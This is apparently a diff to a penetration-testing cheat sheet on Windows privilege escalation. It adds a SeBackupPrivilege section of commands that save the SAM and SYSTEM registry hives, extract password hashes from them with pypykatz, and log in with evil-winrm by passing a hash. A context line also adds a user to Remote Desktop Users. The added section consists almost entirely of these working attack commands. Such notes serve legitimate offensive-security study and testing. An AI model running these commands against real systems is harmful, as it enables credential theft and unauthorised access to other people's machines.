@@ -159,6 +159,18 @@ net localgroup 'Remote Desktop Users' api /add
 - https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
 ---
 # SeBackupPrivilege
+```powershell
+cd c:\
+mkdir Temp
+reg save hklm\sam c:\Temp\sam
+reg save hklm\system c:\Temp\system
+```
+
+```bash
+pypykatz registry --sam sam system
+
+evil-winrm -i <ip> -u <user> -H <hash>
+```
 - https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege
 ---
 # PowerUp.ps1
